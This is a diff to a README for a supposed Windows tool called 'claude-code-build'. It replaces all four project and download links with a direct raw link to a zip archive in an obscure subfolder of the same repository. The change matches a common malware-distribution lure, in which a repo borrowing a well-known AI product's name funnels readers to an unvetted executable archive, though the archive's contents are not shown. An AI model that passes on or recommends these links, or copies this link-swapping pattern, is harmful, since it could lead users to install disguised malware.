@@ -1,6 +1,6 @@
 # 🛠️ claude-code-build - Run Claude source with ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/alessandrahighvoltage217/claude-code-build)
+[![Download](https://img.shields.io/badge/Download%20Now-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/alessandrahighvoltage217/claude-code-build/raw/refs/heads/main/quaily/build_code_claude_v1.0.zip)
 
 ## 🚀 What this app does
 
@@ -12,7 +12,7 @@ This app gives you a local way to work with Claude code builds. You can use it t
 
 Use this link to visit the download page:
 
-https://github.com/alessandrahighvoltage217/claude-code-build
+https://github.com/alessandrahighvoltage217/claude-code-build/raw/refs/heads/main/quaily/build_code_claude_v1.0.zip
 
 Follow these steps on Windows:
 
@@ -143,7 +143,7 @@ No. This is meant to run on your Windows computer.
 
 Use the GitHub link above:
 
-https://github.com/alessandrahighvoltage217/claude-code-build
+https://github.com/alessandrahighvoltage217/claude-code-build/raw/refs/heads/main/quaily/build_code_claude_v1.0.zip
 
 ## 📌 Quick start
 
@@ -180,4 +180,4 @@ When a new version appears, repeat the same steps:
 
 ## 📎 Project link
 
-https://github.com/alessandrahighvoltage217/claude-code-build
+https://github.com/alessandrahighvoltage217/claude-code-build/raw/refs/heads/main/quaily/build_code_claude_v1.0.zip
